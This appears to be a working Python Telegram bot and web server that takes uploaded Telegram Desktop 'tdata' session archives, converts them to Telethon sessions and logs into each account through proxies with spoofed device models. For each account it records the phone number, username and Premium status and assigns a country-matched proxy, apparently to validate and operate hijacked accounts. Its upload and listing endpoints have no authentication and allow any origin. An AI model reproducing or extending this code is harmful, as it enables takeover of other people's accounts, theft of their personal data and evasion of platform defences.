import asyncio
import os
import json
import zipfile
import io
import random
import shutil
import traceback
import requests
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher
from aiogram.types import Message, WebAppInfo
from aiogram.filters import Command
from aiohttp import web
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.users import GetFullUserRequest
from tdata_reader import read_tdata
from python_socks import ProxyType # Используем python-socks

TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.getenv("PORT", 8080))
ADMIN_ID = 8720671692 

bot = Bot(token=TOKEN)
dp = Dispatcher()

data_dir = Path("/app/data")
data_dir.mkdir(parents=True, exist_ok=True)
ACCOUNTS_FILE = data_dir / "accounts.json"
DEVICES_FILE = data_dir / "devices.json"
TDATA_DIR = data_dir / "tdata"
TDATA_DIR.mkdir(exist_ok=True)

DEVICES = [
    {"model": "Desktop", "system": "Windows 10", "app": "4.8.1"},
    {"model": "Xiaomi Redmi Note 10", "system": "Android 12", "app": "9.6.1"},
    {"model": "iPhone 13", "system": "iOS 16.1", "app": "9.6.0"},
    {"model": "Samsung Galaxy S22", "system": "Android 13", "app": "9.7.0"}
]

def load_json(file_path, default):
    if file_path.exists():
        try:
            with open(file_path, "r", encoding="utf-8") as f: return json.load(f)
        except Exception: return default
    return default

def save_json(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)

def get_sticky_device(acc_id):
    devices = load_json(DEVICES_FILE, {})
    if acc_id not in devices:
        devices[acc_id] = random.choice(DEVICES)
        save_json(DEVICES_FILE, devices)
    return devices[acc_id]

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if " " in proxy_str: proxy_str = proxy_str.split(" ")[-1] 
    if not proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
        proxy_str = 'socks5://' + proxy_str
        
    parsed = urlparse(proxy_str)
    if parsed.scheme == 'socks5': p_type = ProxyType.SOCKS5
    elif parsed.scheme == 'socks4': p_type = ProxyType.SOCKS4
    else: p_type = ProxyType.HTTP
        
    return (p_type, parsed.hostname, parsed.port, True, parsed.username, parsed.password), proxy_str, parsed.hostname

def get_ip_country(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,countryCode", timeout=3)
        if r.json().get("status") == "success":
            return r.json().get("countryCode")
    except: pass
    return "UNKNOWN"

# --- CORS MIDDLEWARE ---
@web.middleware
async def cors_middleware(request, handler):
    if request.method == 'OPTIONS':
        return web.Response(
            status=200,
            headers={
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
                "Access-Control-Allow-Headers": "Content-Type",
            }
        )
    response = await handler(request)
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response

async def handle_upload_and_process(request):
    try:
        print("=== НАЧАЛО ОБРАБОТКИ ===")
        post = await request.post()
        zip_field = post.get('tdata_zip')
        proxies_field = post.get('proxies')

        if not zip_field or not proxies_field:
            return web.json_response({"status": "error", "message": "Нет файла или прокси"}, status=400)

        zip_data = zip_field.file.read()
        proxies_text = proxies_field.strip()

        if TDATA_DIR.exists(): shutil.rmtree(TDATA_DIR)
        TDATA_DIR.mkdir()
        print("Распаковка ZIP...")
        with zipfile.ZipFile(io.BytesIO(zip_data)) as z: 
            z.extractall(TDATA_DIR)

        proxy_list = []
        for p_raw in proxies_text.split('\n'):
            p_raw = p_raw.strip()
            if not p_raw: continue
            p_tuple, p_str, p_ip = parse_proxy(p_raw)
            country = get_ip_country(p_ip)
            proxy_list.append({"raw": p_str, "tuple": p_tuple, "country": country})
            print(f"Прокси {p_ip} -> Страна: {country}")

        if not proxy_list: return web.json_response({"status": "error", "message": "Пустой список прокси"}, status=400)

        accounts = []
        folders = [d for d in TDATA_DIR.iterdir() if d.is_dir()]
        print(f"Найдено папок: {len(folders)}")
        
        for i, folder in enumerate(folders):
            print(f"Обработка {folder.name}...")
            acc_id = folder.name 
            device = get_sticky_device(acc_id)

            acc_info = {
                "id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", "country": "Неизвестно",
                "ip": "N/A", "proxy_country": "UNKNOWN", "time": datetime.now().strftime("%H:%M"),
                "premium": False, "premium_expires": "Нет", "valid": False, 
                "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
            }

            try:
                acc = read_tdata(str(folder))
                session_string = acc.to_string_session()
                
                temp_proxy = random.choice(proxy_list)
                client = TelegramClient(
                    StringSession(session_string), acc.api_id, acc.api_hash, 
                    device_model=device['model'], system_version=device['system'], 
                    proxy=temp_proxy['tuple']
                )
                
                await client.connect()
                
                if await client.is_user_authorized():
                    me = await client.get_me()
                    acc_info["username"] = me.username or me.first_name or "Без юзернейма"
                    acc_info["first_name"] = me.first_name or ""
                    acc_info["phone"] = f"+{me.phone}" if me.phone else "Скрыт"
                    acc_info["valid"] = True
                    
                    full_user = await client(GetFullUserRequest(me.id))
                    if full_user.full_user.premium_expires:
                        acc_info["premium"] = True
                        exp_date = datetime.fromtimestamp(full_user.full_user.premium_expires)
                        acc_info["premium_expires"] = exp_date.strftime("%d.%m.%Y")
                    
                    if me.phone:
                        acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
                        
                    matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
                    if matching_proxies:
                        chosen_proxy = random.choice(matching_proxies)
                    else:
                        chosen_proxy = temp_proxy
                        
                    acc_info["proxy"] = chosen_proxy["raw"]
                    acc_info["proxy_country"] = chosen_proxy["country"]
                    acc_info["ip"] = chosen_proxy["tuple"][1]
                    
                    await client.disconnect()
                else:
                    acc_info["username"] = "Не авторизован"
                    await client.disconnect()

            except Exception as e:
                print(f"ОШИБКА АККАУНТА {folder.name}: {e}")
                acc_info["username"] = f"Ошибка: {str(e)[:20]}"

            accounts.append(acc_info)

        save_json(ACCOUNTS_FILE, accounts)
        print("=== УСПЕШНО ЗАВЕРШЕНО ===")
        return web.json_response({"status": "ok", "message": f"Обработано: {len(accounts)}"})

    except Exception as e:
        print("=== ГЛОБАЛЬНАЯ ОШИБКА ===")
        traceback.print_exc()
        return web.json_response({"status": "error", "message": f"Ошибка: {str(e)}"}, status=500)

async def handle_get_accounts(request):
    return web.json_response(load_json(ACCOUNTS_FILE, []))

async def handle_get_premium_link(request):
    acc_id = request.query.get('account_id')
    accounts = load_json(ACCOUNTS_FILE, [])
    acc = next((a for a in accounts if a["id"] == acc_id), None)
    
    if not acc:
        return web.json_response({"status": "error", "message": "Аккаунт не найден"}, status=404)

    return web.json_response({
        "status": "ok", 
        "premium_url": "https://t.me/PremiumBot",
        "proxy": acc.get("proxy", "Прокси не назначен"),
        "country": acc.get("proxy_country", "UNKNOWN")
    })

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id == ADMIN_ID:
        web_app = WebAppInfo(url="https://lavrinuksasha5-prog.github.io/premium-bot-web/") 
        await message.answer("Открой панель 👇", reply_markup={"keyboard": [[{"text": "Управление", "web_app": web_app}]], "resize_keyboard": True})

async def main():
    app = web.Application(client_max_size=1024**3, middlewares=[cors_middleware])
    app.router.add_post('/api/upload', handle_upload_and_process)
    app.router.add_get('/api/accounts', handle_get_accounts)
    app.router.add_get('/api/get_premium_link', handle_get_premium_link)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
